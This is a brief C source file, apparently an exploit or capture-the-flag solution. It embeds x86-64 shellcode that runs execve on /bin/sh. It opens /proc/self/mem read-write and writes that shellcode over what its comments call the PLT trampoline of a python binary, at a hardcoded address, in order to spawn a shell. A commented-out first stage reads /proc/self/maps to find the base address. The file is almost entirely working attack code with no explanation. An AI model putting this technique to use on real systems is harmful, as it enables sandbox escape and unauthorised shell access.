#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <stdio.h>
#include <sys/types.h>

unsigned char shellcode[] = {
  0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 
  0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 
  0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 
  0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 
  0x3b, 0x0f, 0x05, 0x00
};

int main() {

        DIR* cwd;
        cwd = opendir(".");
        int cwdfd = dirfd(cwd);

        // STAGE1
        // read /proc/self/maps and locate the base address of the python binary
        /*
        char data[26000];
        int fd1 = openat(cwdfd, "/proc/self/maps", O_RDONLY);

        read(fd1, data, 26000);
        write(1, data, 26000);
        */

        // STAGE2
        // overwrite the PLT trampoline with shellcode to run execv("/bin/sh")
        int fd2 = openat(cwdfd, "/proc/self/mem", O_RDWR);

        lseek(fd2, 0x00423000 + 0x20, SEEK_SET);
        write(fd2, shellcode, strlen(shellcode));

}
